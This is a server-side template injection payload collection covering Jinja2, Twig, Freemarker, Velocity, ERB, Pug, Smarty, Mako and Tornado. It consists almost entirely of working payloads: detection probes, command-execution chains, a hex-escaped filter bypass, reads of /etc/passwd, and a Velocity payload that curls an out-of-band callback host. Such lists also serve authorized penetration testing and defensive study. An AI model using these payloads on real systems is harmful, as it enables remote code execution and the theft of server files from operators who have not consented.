# SSTI Payload Collection

## Detection probes
```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{7*'7'}}
${{7*7}}
@(7*7)
{{config}}
```

## Jinja2 / Flask (Python)

### Object chain RCE
```python
{{ config.items() }}
{{ self.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Filter bypass (blacklisted chars)
```python
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
{{ lipsum|attr(request.args.a) }}&a=__globals__
```

## Twig (PHP)
```twig
{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
{{ ['id']|map('system')|join }}
{{ {'pwnd': 'id'}|map('system')|join }}
{{ include('/etc/passwd') }}
{{ source('/etc/passwd') }}
```

## Freemarker (Java)
```freemarker
${7*7}
${"freemarker".toUpperCase()}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd")}
```

## Velocity (Java)
```velocity
#set($s="")
#set($class=$s.getClass())
#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
$runtime.exec("curl http://<dnslog>/vel")
```

## ERB (Ruby)
```erb
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
```

## Pug / Jade (Node.js)
```pug
#{7*7}
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

## Smarty (PHP)
```smarty
{php}echo shell_exec('id');{/php}
{if system('id')}{/if}
```

## Mako (Python)
```mako
${7*7}
<% import os; os.system('id') %>
```

## Tornado (Python)
```
{{ handler.settings }}
{% import os %}{{ os.popen('id').read() }}
```
